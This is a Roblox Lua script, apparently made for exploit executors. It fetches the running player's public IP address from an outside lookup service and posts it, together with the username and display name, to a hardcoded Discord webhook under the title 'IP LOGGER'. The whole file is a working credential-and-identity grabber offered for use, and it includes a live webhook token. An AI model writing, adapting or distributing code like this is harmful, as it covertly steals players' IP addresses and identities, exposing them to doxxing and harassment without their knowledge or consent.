local httpService = game:GetService("HttpService")
local webhookURL = "https://discord.com/api/webhooks/1069277187087282217/DVmZLD5JdyjzQLARaUCfhq7MZHQJYR9-8UqKusd85gbnQ8gSWfsd8Aw60LXI5SpSTtti"

local request = (syn and syn.request) or request or (http and http.request) or http_request

request({
    Url = webhookURL,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json",
    },
    Body = httpService:JSONEncode({
        content = "",
        embeds = {
            {
                title = "IP LOGGER",
                description = "GRABBED IP!",
                color = 0x051,
                fields = {
                    {
                        name = "Username",
                        value = game.Players.LocalPlayer.Name.." ("..game.Players.LocalPlayer.DisplayName..")",
                        inline = true,
                    },
                    {
                        name = "IP: ",
                        value = game:HttpGet("https://v4.ident.me/"),
                        inline = true,
                    }, 
                },
            },
        },
    }),
})
